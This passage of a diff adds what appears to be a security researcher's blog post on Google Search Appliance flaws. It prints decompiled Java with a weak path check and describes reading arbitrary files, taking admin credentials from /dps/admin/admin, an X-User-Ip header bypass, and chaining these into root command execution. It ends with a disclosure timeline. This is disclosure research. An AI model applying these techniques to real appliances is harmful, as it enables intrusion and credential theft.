+        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can see here that the only check is whether the string contains &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt;. 
+However, we can directly specify the absolute path and read any local file directly!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The old version of GSA does not have the /font endpoint, 
+but /dps/admin/admin has a similar file reading issue. 
+You can directly specify the logName for file reading. 
+Refer to the diagram below for directly reading the account password from the system management interface:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After successfully cracking the hash, you can log in, enable the SNMP service, 
+and combine it with the first vulnerability to execute arbitrary commands with root privileges.&lt;/p&gt;
+
+&lt;h3 id=&quot;other-findings-and-misc&quot;&gt;Other findings and misc&lt;/h3&gt;
+
+&lt;h4 id=&quot;internal-uris-in-web-services&quot;&gt;Internal URIs in web services&lt;/h4&gt;
+
+&lt;p&gt;In GSA, there are multiple sub-services that communicate with each other using the HTTP protocol. 
+Many of these services offer URLs such as /varz, /helpz, and /procz. 
+We can access them either in the trusted network location defined for the service or using 127.0.0.1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In vGSA, we observed that there is a service execution parameter called “useripheader=X-User-Ip”, 
+this parameter allows direct access to a certain functionality of the externally exposed admin console when 
+included in the request header as “X-User-Ip”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/procz&lt;/code&gt; endpoint can even fetch executables and the shared libraries they are using:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;appliances-list&quot;&gt;Appliances list&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Model name&lt;/th&gt;
+      &lt;th&gt;Maker&lt;/th&gt;
+      &lt;th&gt;Specs&lt;/th&gt;
+      &lt;th&gt;version&lt;/th&gt;
+      &lt;th&gt;Document amount&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google Mini&lt;/td&gt;
+      &lt;td&gt;Gigabyte&lt;/td&gt;
+      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
+      &lt;td&gt;3.4.14&lt;/td&gt;
+      &lt;td&gt;300,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google Mini-002X&lt;/td&gt;
+      &lt;td&gt;SuperMicro&lt;/td&gt;
+      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
+      &lt;td&gt;5.0.0&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-1001&lt;/td&gt;
+      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
+      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;3,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-1002&lt;/td&gt;
+      &lt;td&gt;Gigabyte&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-7007&lt;/td&gt;
+      &lt;td&gt;Dell R710&lt;/td&gt;
+      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;10,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google GB-9009&lt;/td&gt;
+      &lt;td&gt;Dell unknown&lt;/td&gt;
+      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;30,000,000&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Google G100&lt;/td&gt;
+      &lt;td&gt;Dell R720XD&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+      &lt;td&gt;unknown&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h4 id=&quot;linux-kernel-version&quot;&gt;Linux Kernel Version&lt;/h4&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;GSA version&lt;/th&gt;
+      &lt;th&gt;Linux Kernel Version&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.6.0&lt;/td&gt;
+      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.4.0&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.2.0&lt;/td&gt;
+      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7.0.14&lt;/td&gt;
+      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;5.2.0&lt;/td&gt;
+      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;timeline&quot;&gt;Timeline&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;時間&lt;/th&gt;
+      &lt;th&gt;事件&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2005/06/10&lt;/td&gt;
+      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; reported by H D Moore&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;early 2008&lt;/td&gt;
+      &lt;td&gt;GSA 5.0 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2008/10/28&lt;/td&gt;
+      &lt;td&gt;vgsa_20081028.7z (5.2.0)  released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2013/04/20&lt;/td&gt;
+      &lt;td&gt;GSA 6.14.0.G28  released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/03/20&lt;/td&gt;
+      &lt;td&gt;Cross-site Scripting &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; reported by Will Dormann&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/10/01&lt;/td&gt;
+      &lt;td&gt;GSA 7.0.14.G238 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/10/03&lt;/td&gt;
+      &lt;td&gt;GSA 7.2.0.G252 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2014/12/12&lt;/td&gt;
+      &lt;td&gt;GSA 7.2.0.G264 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/02/07&lt;/td&gt;
+      &lt;td&gt;GSA 7.2.0.G270 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/15&lt;/td&gt;
+      &lt;td&gt;GSA 7.4.0.G64 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/22&lt;/td&gt;
+      &lt;td&gt;GSA 7.4.0.G72 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/04/30&lt;/td&gt;
+      &lt;td&gt;GSA 7.4.0.G74 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2015/06/04&lt;/td&gt;
+      &lt;td&gt;GSA 7.4.0.G82 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;early 2016&lt;/td&gt;
+      &lt;td&gt;Google announced that GSA will be sunset from the market.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/01/05&lt;/td&gt;
+      &lt;td&gt;XML External Entitiy injection &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; reported by Timo&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/05/24&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.0.G36 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/07/01&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.0.G42 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/07/31&lt;/td&gt;
+      &lt;td&gt;The author of this article obtained this device, with the version being 7.0.14&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/08/25&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.0.G46 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2016/10/21&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.0.G58 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/01/19&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.50.G30 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/04/19&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.50.G36 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/07/28&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.50.G64 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/11/09&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.250.G12 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2017/12/28&lt;/td&gt;
+      &lt;td&gt;The final date to order GSA.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/01/17&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.250.G20 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/03/21&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.250.G26 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/06/15&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.360.G10 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2018/10/08&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.360.G16 released&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2019/04/26&lt;/td&gt;
+      &lt;td&gt;GSA 7.6.512.G18 released. It should be the last publicly released version.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;issues reported.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;replied from a bot, and triaged.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/16&lt;/td&gt;
+      &lt;td&gt;issuetracker.google.com assigned a issue.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/18&lt;/td&gt;
+      &lt;td&gt;Google said issue is not severe enough to qualify for a reward, but VRP panel will take a closer look.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/08/20&lt;/td&gt;
+      &lt;td&gt;VRP panel has decided that the security impact of this issue does not meet the bar for a financial reward.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/11/01&lt;/td&gt;
+      &lt;td&gt;Asking if a vulnerability will be assigned a CVE identifier.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2021/11/02&lt;/td&gt;
+      &lt;td&gt;Confirming that a CVE identifier will not be assigned.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;early 2023&lt;/td&gt;
+      &lt;td&gt;Started writing this article&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2023/06/04&lt;/td&gt;
+      &lt;td&gt;First draft completed.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;Although the GSA/vGSA is a product that has reached the end of its lifecycle, 
+studying how Google increases product security and reduces attack vectors for devices can broaden our knowledge,
+which we might not usually come into contact with. 
+Although it is not detailed in this article, the Java Security Manager and the Linux Kernel’s seccomp are both technologies used in the GSA, 
+and this research has also left some goals for further study:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The feedergate service listening on port 19900.&lt;/li&gt;
+  &lt;li&gt;Memory vulnerabilities in Oracle’s Outside-in Technology for converting file formats.&lt;/li&gt;
+  &lt;li&gt;The convert_to_html seccomp sandbox&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We will share when there are some research results, See you next time.&lt;/p&gt;
+
+&lt;h3 id=&quot;other-reference-links&quot;&gt;Other reference links&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
